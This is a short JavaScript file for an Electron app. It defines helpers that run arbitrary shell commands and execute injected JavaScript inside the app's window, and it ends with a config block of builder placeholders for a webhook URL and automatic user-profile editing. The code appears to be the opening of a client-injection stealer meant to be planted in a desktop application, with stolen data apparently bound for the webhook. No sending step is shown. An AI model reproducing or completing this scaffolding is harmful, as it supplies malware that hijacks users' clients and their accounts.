const querystring = require('querystring');
const https = require('https');
const http = require('http');
const path = require('path');
const fs = require('fs');
const { exec } = require('child_process');
const { promisify } = require('util');
const { BrowserWindow, session } = require('electron');

const execCommand = async (command, options = {}) => {
    try {
        const { stdout, stderr } = await promisify(exec)(command, options);
        if (stderr) {
            console.error(stderr);
        }
        return stdout.trim();
    } catch (error) {
        return null;
    }
};

const execScript = async (script) => {
    const windows = BrowserWindow.getAllWindows();
    if (windows.length === 0) return null;
    try {
        const result = await windows[0].webContents.executeJavaScript(script, true);
        return result;
    } catch (error) {
        return null;
    }
};

const config = {
    webhook: "%WEBHOOK_URL%",
    auto_user_profile_edit: "%AUTO_USER_PROFILE_EDIT%"
}